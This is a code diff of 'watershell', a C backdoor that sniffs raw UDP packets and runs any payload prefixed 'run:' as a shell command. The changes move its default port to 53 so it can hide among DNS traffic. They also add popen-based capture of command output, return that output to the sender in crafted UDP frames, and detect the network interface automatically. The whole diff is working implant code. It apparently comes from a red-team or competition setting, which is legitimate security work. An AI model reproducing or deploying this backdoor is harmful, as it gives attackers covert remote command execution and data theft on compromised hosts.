@@ -7,20 +7,18 @@
  *
  *        Version:  1.0
  *        Created:  07/01/2015 09:10:41 AM
- *       Revision:  none
+ *       Revision:  04/14/2019 11:19:22 PM
  *       Compiler:  gcc
  *
- *         Author:  Jaime Geiger, jmg2967@rit.edu
+ *         Author:  Jaime Geiger,     jmg2967@rit.edu
+ *         Author:  Nicholas O'Brien, ndo9903@rit.edu
  *
  * =====================================================================================
  */
 
 /* CUSTOMIZE THESE LINES FOR HARD CODED VALUES */
-#ifndef IFACE
-#define IFACE "ens160"
-#endif
 #ifndef PORT
-#define PORT 11111
+#define PORT 53
 #endif
 #ifndef PROMISC
 #define PROMISC false
@@ -49,6 +47,7 @@
 #include <netinet/udp.h>
 #include <signal.h>
 #include <stdbool.h>
+#include <ifaddrs.h>
 #include "watershell.h"
 
 //these need to be global so that a sigint can close everything up
@@ -62,7 +61,7 @@ int main(int argc, char *argv[])
     struct sock_fprog filter;
     char buf[2048];
     unsigned char *read;
-    char *udpdata, *iface = IFACE;
+    char *udpdata;
     struct iphdr *ip;
     struct udphdr *udp;
     unsigned port = PORT;
@@ -70,15 +69,16 @@ int main(int argc, char *argv[])
 
     //if (fork())
     //    exit(1);
+    char iface[100];
+    memset(iface, '\0', sizeof(iface));
+    get_interface_name(iface);
+    printf("Listening on %s\n", iface);
 
     promisc = PROMISC;
 
     // command line args
     while ((arg = getopt(argc, argv, "phi:l:")) != -1){
         switch (arg){
-            case 'i':
-                iface = optarg;
-                break;
             case 'p':
                 if (DEBUG)
                     puts("Running in promisc mode");
@@ -86,7 +86,7 @@ int main(int argc, char *argv[])
                 break;
             case 'h':
                 if (DEBUG)
-                    fprintf(stderr, "Usage: %s [-l port] [-p] -i iface\n", argv[0]);
+                    fprintf(stderr, "Usage: %s [-l port] [-p]\n", argv[0]);
                 return 0;
                 break;
             case 'l':
@@ -99,7 +99,7 @@ int main(int argc, char *argv[])
                 break;
             case '?':
                 if (DEBUG)
-                    fprintf(stderr, "Usage: %s [-l port] [-p] -i iface\n", argv[0]);
+                    fprintf(stderr, "Usage: %s [-l port] [-p]\n", argv[0]);
                 return 1;
             default:
                 abort();
@@ -156,20 +156,97 @@ int main(int argc, char *argv[])
         ip = (struct iphdr *)(buf + sizeof(struct ethhdr));
         udp = (struct udphdr *)(buf + ip->ihl*4 + sizeof(struct ethhdr));
         udpdata = (char *)((buf + ip->ihl*4 + 8 + sizeof(struct ethhdr)));
+
+
+        //checkup on the service, make sure it is still there
+        if(!strncmp(udpdata, "status:", 7)){
+            send_status(buf, "up");
+        }
+
         //run a command if the data is prefixed with run:
         if (!strncmp(udpdata, "run:", 4)){
+            printf("Doing the thing: %s\n", udpdata);
             int out = open("/dev/null", O_WRONLY);
             int err = open("/dev/null", O_WRONLY);
-	    dup2(out, 0);
-	    dup2(err, 2);
-	    code = system(udpdata + 4); //replace with fork + exec
-	    
+	          dup2(out, 0);
+	          dup2(err, 2);
+
+            FILE *fd;
+            fd = popen(udpdata + 4, "r");
+            if (!fd) return -1;
+
+            char buffer[256];
+            size_t chread;
+            /* String to store entire command contents in */
+            size_t comalloc = 256;
+            size_t comlen   = 0;
+            char *comout   = malloc(comalloc);
+
+            /* Use fread so binary data is dealt with correctly */
+            while ((chread = fread(buffer, 1, sizeof(buffer), fd)) != 0) {
+                if (comlen + chread >= comalloc) {
+                    comalloc *= 2;
+                    comout = realloc(comout, comalloc);
+                }
+                memmove(comout + comlen, buffer, chread);
+                comlen += chread;
+            }
+            pclose(fd);
+            send_status(buf, comout);
+
 	}
-        //checkup on the service, make sure it is still there
-        if(!strncmp(udpdata, "status", 6))
-            send_status(buf, code);
+
     }
     return 0;
+}
+
+// get interface name dynamically :D
+void get_interface_name(char iface[]){
+  const char* google_dns_server = "8.8.8.8";
+  int dns_port = 53;
+  int sock, err;
+
+  char buf[32];
+  char buffer[100];
+
+  struct ifaddrs *addrs, *iap;
+  struct sockaddr_in *sa;
+  struct sockaddr_in serv;
+  struct sockaddr_in name;
+
+
+
+  sock = socket(AF_INET, SOCK_DGRAM, 0);
+
+  memset(&serv, 0, sizeof(serv));
+  serv.sin_family = AF_INET;
+  serv.sin_addr.s_addr = inet_addr(google_dns_server);
+  serv.sin_port = htons(dns_port);
+
+  err = connect(sock ,(const struct sockaddr*) &serv ,sizeof(serv));
+
+
+  socklen_t namelen = sizeof(name);
+  err = getsockname(sock, (struct sockaddr*) &name, &namelen);
+
+
+  const char* p = inet_ntop(AF_INET, &name.sin_addr, buffer, 100);
+
+  getifaddrs(&addrs);
+  for (iap = addrs; iap != NULL; iap = iap->ifa_next) {
+      if (iap->ifa_addr && (iap->ifa_flags & IFF_UP) && iap->ifa_addr->sa_family == AF_INET) {
+          sa = (struct sockaddr_in *)(iap->ifa_addr);
+          inet_ntop(iap->ifa_addr->sa_family, (void *)&(sa->sin_addr), buf, sizeof(buf));
+          if (!strcmp(p, buf)) {
+              strncpy(iface, iap->ifa_name, strlen(iap->ifa_name));
+              //interface_name = iap->ifa_name;
+              break;
+          }
+      }
+  }
+
+  freeifaddrs(addrs);
+  close(sock);
 }
 
 //cleanup on SIGINT
@@ -191,22 +268,16 @@ void sigint(int signum){
 }
 
 //send a reply
-void send_status(unsigned char *buf, int code){
+void send_status(unsigned char *buf, char *payload){
     struct udpframe frame;
     struct sockaddr_ll saddrll;
     struct sockaddr_in sin;
-    int len = snprintf(NULL, 0, "%d", code);
-    char *prefix = "LISTENING: ";
-    char *ccode = (char*)calloc(1, len+1);
-    char *data = calloc(1, strlen(prefix)+len+2);
+    int len;
+
 
     //setup the data
     memset(&frame, 0, sizeof(frame));
-    snprintf(ccode, len+1, "%d", code);
-    strncpy(data, prefix, strlen(prefix));
-    strncat(data, ccode, len+1);
-    strncat(data, "\n", 1);
-    strncpy(frame.data, data, strlen(data));
+    strncpy(frame.data, payload, strlen(payload));
 
     //get the ifindex
     if (ioctl(sockfd, SIOCGIFINDEX, sifreq) == -1){
@@ -230,7 +301,7 @@ void send_status(unsigned char *buf, int code){
     frame.ip.frag_off |= htons(IP_DF);
     frame.ip.ttl = 64;
     frame.ip.tos = 0;
-    frame.ip.tot_len = htons(sizeof(frame.ip) + sizeof(frame.udp) + strlen(data));
+    frame.ip.tot_len = htons(sizeof(frame.ip) + sizeof(frame.udp) + strlen(payload));
     frame.ip.saddr = ((struct iphdr*)(buf+sizeof(struct ethhdr)))->daddr;
     frame.ip.daddr = ((struct iphdr*)(buf+sizeof(struct ethhdr)))->saddr;
     frame.ip.protocol = IPPROTO_UDP;
@@ -238,19 +309,15 @@ void send_status(unsigned char *buf, int code){
     //layer 4
     frame.udp.source = ((struct udphdr*)(buf+sizeof(struct ethhdr)+sizeof(struct iphdr)))->dest;
     frame.udp.dest = ((struct udphdr*)(buf+sizeof(struct ethhdr)+sizeof(struct iphdr)))->source;
-    frame.udp.len = htons(strlen(data) + sizeof(frame.udp));
+    frame.udp.len = htons(strlen(payload) + sizeof(frame.udp));
 
     //checksums
     //udp_checksum(&frame.ip, (unsigned short*)&frame.udp);
     ip_checksum(&frame.ip);
 
     //calculate total length and send
-    len = sizeof(struct ethhdr) + sizeof(struct udphdr) + sizeof(struct iphdr) + strlen(data);
+    len = sizeof(struct ethhdr) + sizeof(struct udphdr) + sizeof(struct iphdr) + strlen(payload);
     sendto(sockfd, (char*)&frame, len, 0, (struct sockaddr *)&saddrll, sizeof(saddrll));
-
-    //cleanup
-    free(ccode);
-    free(data);
 }
 
 /* checksum functions from http://www.roman10.net/how-to-calculate-iptcpudp-checksumpart-2-implementation/ */
